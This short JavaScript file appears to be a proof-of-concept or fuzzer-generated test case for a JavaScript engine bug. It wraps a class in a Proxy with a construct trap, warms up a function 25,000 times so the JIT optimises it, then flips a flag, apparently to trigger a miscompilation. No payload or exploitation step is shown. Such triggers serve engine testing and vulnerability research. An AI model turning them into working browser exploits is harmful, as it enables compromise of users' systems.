let v0 = false;
class C1 {
}
function f3(a4, a5) {
    if (v0) {
    }
    const v6 = new a4(...a5);
    return v6;
}
const v8 = new Proxy(C1, { construct: f3 });
const P = v8;
function poc_func() {
    new P();
    return [1.1,2.2];
}
for (let i18 = 0; i18 < 25000; ++i18) {
    poc_func();
}
v0 = true;
